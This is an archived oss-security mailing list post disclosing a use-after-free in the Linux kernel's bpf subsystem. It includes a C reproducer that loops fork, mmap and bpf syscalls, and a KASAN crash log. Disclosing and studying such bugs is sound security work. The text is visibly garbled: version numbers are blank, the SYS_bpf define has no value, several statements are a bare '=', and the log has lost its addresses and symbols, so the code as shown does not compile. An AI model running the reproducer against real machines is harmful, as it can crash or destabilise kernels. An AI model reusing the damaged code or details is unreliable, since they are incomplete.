  oss-security - Linux Kernel bpf related UAF            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 12 May From: Marco Grassi <marco.gra@...il.com> To: oss-security@...ts.openwall.com Subject: Linux Kernel bpf related UAF  Hi,  the following reproducer will cause a UAF of a previously allocated memory in bpf.  You can reproduce with linux kernel master, or and maybe other kernel versions.  In the reproducer there is also a log of the UAF with KASAN of the kernel running on qemu x64  Thanks  Marco  Reproducer C file: ==================  // Linux kernel version: or or linux master (tested compiled with KASAN to see the log // Compile it with gcc -o durr durr.c // Run it and it will cause the UAF endlessly see qemu logs dmesg/logs // here there is a example log  /* [  ================================================================== [  BUG: KASAN: use-after-free in at addr [  Read of size 4 by task [  ============================================================================= [  BUG (Tainted: G    B          ): kasan: bad access detected [  ----------------------------------------------------------------------------- [  [  INFO: Allocated in 0xbbbbbbbbbbbbbbbb cpu=0 pid=0 [   [   [   [   [   [   [   [   [   [   [   [  INFO: Freed in 0xffffba5f cpu=0 pid=0 [   [   [   [   [   [   [   [   [   [  INFO: Slab objects=15 used=9 [  INFO: Object fp=0xbbbbbbbbbbbbbbbb [  [  Redzone 00 00 00 00 00 00 00 00                ........ [  Object bb bb bb bb bb bb bb bb 00 00 00 00 00 00 00 00  ................ [  Object 58 d4 3c 6b 00 88 ff ff 00 00 20 00 00 00 20 00  X.<k...... ... . [  Object 00 00 e0 fa ff e8 ff ff 01 00 00 00 00 01 00 00  ................ [  Object 08 80 87 65 00 88 ff ff e0 ff ff ff 0f 00 00 00  ...e............ [  Object 90 d4 85 67 00 88 ff ff 90 d4 85 67 00 88 ff ff  ...g.......g.... [  Object e0 8a 49 81 ff ff ff ff a8 52 92 67 00 88 ff ff  ..I......R.g.... [  Object 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ [  Object 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ [  Object 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ [  Object 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ [  Object 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ [  Object 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ [  Redzone 00 00 00 00 00 00 00 00                ........ [  Padding 61 ba ff ff 00 00 00 00                a....... [  CPU: 0 PID: Comm: durr Tainted: G    B #6 [  Hardware name: QEMU Standard PC + PIIX, BIOS [   [   [   [  Call Trace: [   [   [   [   [   ? [   ? [   [   ? [   [   ? [   [   ? [   ? [   ? [   ? [   ? [   [   [   [   ? [   ? [   ? [   [  Memory state around the buggy address: [   fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [   fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [  fc fc fc fc fc fc fc fc fc fc fc fb fb fb fb fb [      ^ [   fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb [   fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc fc [  ==================================================================  */  #include <stdio.h> #include <unistd.h> #include <sys/syscall.h> #include <string.h> #include <stdint.h> #include <pthread.h>  #ifndef SYS_mmap #define SYS_mmap 9 #endif #ifndef SYS_bpf #define SYS_bpf #endif  long r[6];  int main(int argc, char **argv) {     printf("--beginning of program\n");      while(1) {          pid_t pid = fork();          if (pid == 0)         {             // child process             memset(r, -1, sizeof(r));             r[0] = syscall(SYS_mmap, 0x3ul, 0xfffffffffffffffful, 0x0ul);             =             =             =             =             r[5] = syscall(SYS_bpf, 0x0ul, 0, 0, 0);             return 0;         }         else if (pid > 0)         {             // parent process             memset(r, -1, sizeof(r));             r[0] = syscall(SYS_mmap, 0x3ul, 0xfffffffffffffffful, 0x0ul);             =             =             =             =             r[5] = syscall(SYS_bpf, 0x0ul, 0, 0, 0);             int returnStatus;             waitpid(pid, &returnStatus, 0);             printf("collected child\n");          }         else         {             // fork failed             printf("fork() failed!\n");             return 1;         }     }      printf("--end of program--\n");      return 0; }  =====================   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      